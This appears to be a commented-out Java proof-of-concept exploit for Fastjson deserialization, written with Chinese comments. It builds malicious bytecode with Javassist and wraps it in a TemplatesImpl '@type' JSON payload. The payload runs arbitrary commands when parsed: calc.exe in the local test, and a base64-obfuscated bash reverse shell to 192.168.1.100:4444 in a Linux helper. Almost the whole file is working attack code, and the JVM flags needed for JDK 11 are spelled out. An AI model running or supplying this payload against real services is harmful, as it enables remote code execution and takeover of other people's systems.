//package com.example.vuln.poc;
//
//import com.alibaba.fastjson.JSON;
//import com.alibaba.fastjson.parser.Feature;
//import javassist.ClassPool;
//import javassist.CtClass;
//import javassist.CtConstructor;
//import javassist.CtMethod;
//
//import java.util.Base64;
//
///**
// * TemplatesImpl 利用链 POC - JDK 11 兼容版本
// * 原理：通过加载恶意字节码执行任意代码
// *
// * 注意：JDK 11+ 需要添加JVM参数才能访问内部类：
// * --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED
// * --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED
// * --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.dom=ALL-UNNAMED
// * --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED
// * --add-opens java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED
// */
//public class TemplatesImplPoc {
//
//    public static void main(String[] args) throws Exception {
//        // 生成恶意类字节码
//        String evilClassName = "EvilClass";
//        String base64Bytecode = generateEvilBytecode(evilClassName, "calc.exe");
//
//        System.out.println("生成的恶意类字节码 (Base64):");
//        System.out.println(base64Bytecode);
//        System.out.println("\n");
//
//        // 构造TemplatesImpl利用Payload
//        // 注意：JDK 11中类名可能是 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
//        String payload = "{" +
//                "\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
//                "\"_bytecodes\":[\"" + base64Bytecode + "\"]," +
//                "\"_name\":\"" + evilClassName + "\"," +
//                "\"_tfactory\":{}," +
//                "\"_outputProperties\":{}" +
//                "}";
//
//        System.out.println("=== TemplatesImpl Payload ===");
//        System.out.println(payload);
//
//        // 本地触发测试（会弹出计算器）
//        System.out.println("\n=== 开始触发漏洞 ===");
//        try {
//            Object obj = JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField);
//            System.out.println("触发完成");
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//
//    /**
//     * 使用Javassist生成恶意类字节码 - 修复JDK 11兼容性问题
//     * 不直接引用AbstractTranslet，而是使用字符串指定父类
//     */
//    public static String generateEvilBytecode(String className, String command) throws Exception {
//        ClassPool pool = ClassPool.getDefault();
//
//        // 创建新类
//        CtClass clazz = pool.makeClass(className);
//
//        // 使用字符串设置父类，避免直接引用内部类
//        // 父类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
//        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
//        clazz.setSuperclass(superClass);
//
//        // 添加构造方法，执行恶意代码
//        String cmd = "Runtime.getRuntime().exec(\"" + command + "\");";
//        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
//        constructor.setBody("{" + cmd + "}");
//        clazz.addConstructor(constructor);
//
//        // 添加必需的transform方法（AbstractTranslet的抽象方法）
//        // 使用CtMethod.make而不是CtClass.make
//        CtMethod transform1 = CtMethod.make(
//                "public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, " +
//                        "com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) " +
//                        "throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", clazz);
//        clazz.addMethod(transform1);
//
//        CtMethod transform2 = CtMethod.make(
//                "public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, " +
//                        "com.sun.org.apache.xalan.internal.xsltc.DTMAxisIterator iterator, " +
//                        "com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) " +
//                        "throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", clazz);
//        clazz.addMethod(transform2);
//
//        // 获取字节码并Base64编码
//        byte[] bytecode = clazz.toBytecode();
//        return Base64.getEncoder().encodeToString(bytecode);
//    }
//
//    /**
//     * 生成Linux版本的Payload（反弹shell示例）
//     */
//    public static String generateLinuxPayload() throws Exception {
//        // bash -i >& /dev/tcp/attacker_ip/4444 0>&1 的base64编码
//        String cmd = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}";
//        return generateEvilBytecode("EvilShell", cmd);
//    }
//}